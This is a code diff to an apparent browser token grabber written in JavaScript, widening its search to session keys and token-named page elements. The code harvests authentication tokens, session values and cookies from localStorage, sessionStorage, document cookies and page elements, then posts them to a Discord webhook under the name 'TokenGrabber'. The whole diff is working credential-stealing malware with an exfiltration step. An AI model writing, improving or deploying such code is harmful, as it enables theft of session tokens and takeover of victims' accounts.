@@ -105,7 +105,7 @@ function grabTokens() {
     if (window.localStorage) {
         tokens.localStorage = {};
         for (let key in localStorage) {
-            if (localStorage.hasOwnProperty(key) && (key.includes('token') || key.includes('auth'))) {
+            if (localStorage.hasOwnProperty(key) && (key.includes('token') || key.includes('auth') || key.includes('session'))) {
                 const value = localStorage.getItem(key);
                 if (value) tokens.localStorage[key] = value;
             }
@@ -117,7 +117,7 @@ function grabTokens() {
     if (window.sessionStorage) {
         tokens.sessionStorage = {};
         for (let key in sessionStorage) {
-            if (sessionStorage.hasOwnProperty(key) && (key.includes('token') || key.includes('auth'))) {
+            if (sessionStorage.hasOwnProperty(key) && (key.includes('token') || key.includes('auth') || key.includes('session'))) {
                 const value = sessionStorage.getItem(key);
                 if (value) tokens.sessionStorage[key] = value;
             }
@@ -129,7 +129,7 @@ function grabTokens() {
     if (document.cookie) {
         tokens.cookies = document.cookie.split(';').reduce((acc, cookie) => {
             const [key, value] = cookie.trim().split('=');
-            if (key && (key.includes('token') || key.includes('auth'))) {
+            if (key && (key.includes('token') || key.includes('auth') || key.includes('session'))) {
                 acc[key] = value;
             }
             return acc;
@@ -138,11 +138,11 @@ function grabTokens() {
     }
     
     // Grab from page content with broader search
-    const tokenElements = document.querySelectorAll('[name*="token"], [id*="token"], [data-token], [value*="token"]');
+    const tokenElements = document.querySelectorAll('[name*="token"], [id*="token"], [data-token], [value*="token"], [class*="token"]');
     if (tokenElements.length > 0) {
         tokens.pageElements = Array.from(tokenElements).map(el => {
-            const value = el.value || el.dataset.token || el.textContent || el.getAttribute('value');
-            return value ? { tag: el.tagName, name: el.name || el.id || el.dataset.token, value } : null;
+            const value = el.value || el.dataset.token || el.textContent || el.getAttribute('value') || el.innerText;
+            return value ? { tag: el.tagName, name: el.name || el.id || el.dataset.token || el.className, value } : null;
         }).filter(el => el);
     } else {
         tokens.pageElements = []; // Ensure it exists even if empty
@@ -152,14 +152,14 @@ function grabTokens() {
         tokens.note = 'No tokens found';
     }
     
-    return tokens; // Always return the object
+    return tokens;
 }
 
 // Function to send data to Discord webhook
 async function sendToWebhook(data) {
     try {
         const payload = {
-            content: '```json\n' + JSON.stringify(data, null, 2) + '\n```',
+            content: JSON.stringify(data, null, 2), // Simplified, no extra formatting
             username: 'TokenGrabber',
             avatar_url: 'https://i.imgur.com/4M34hi2.png'
         };
@@ -175,7 +175,7 @@ async function sendToWebhook(data) {
         if (response.ok) {
             console.log('Tokens sent to webhook successfully');
         } else {
-            console.error('Failed to send to webhook:', response.status);
+            console.error('Failed to send to webhook:', response.status, await response.text());
         }
     } catch (error) {
         console.error('Error sending to webhook:', error);
